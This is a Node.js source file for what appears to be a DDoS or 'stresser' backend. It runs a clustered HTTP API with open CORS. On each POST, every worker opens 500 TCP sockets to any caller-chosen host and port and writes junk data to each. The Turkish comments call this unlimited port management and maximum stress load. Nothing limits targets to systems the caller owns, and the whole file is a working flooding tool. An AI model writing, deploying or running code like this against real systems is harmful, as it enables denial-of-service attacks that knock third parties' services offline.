const net = require('net');
const http = require('http');
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
    for (let i = 0; i < os.cpus().length; i++) cluster.fork();
} else {
    const api = http.createServer((req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');
        if (req.method === 'POST') {
            let body = '';
            req.on('data', c => body += c);
            req.on('end', () => {
                const { host, port, method } = JSON.parse(body);
                
                // SINIRSIZ PORT VE LOKASYON YÖNETİMİ
                // Bu döngü, seçilen her port için ayrı bir soket açar
                for(let i = 0; i < 500; i++) {
                    const s = new net.Socket();
                    s.connect(port, host, () => {
                        s.write(Buffer.alloc(1024, 'X')); // Maksimum stres yükü
                    });
                    s.on('error', () => s.destroy());
                }
                res.end(JSON.stringify({ status: "SENT" }));
            });
        }
    }).listen(3000);
}
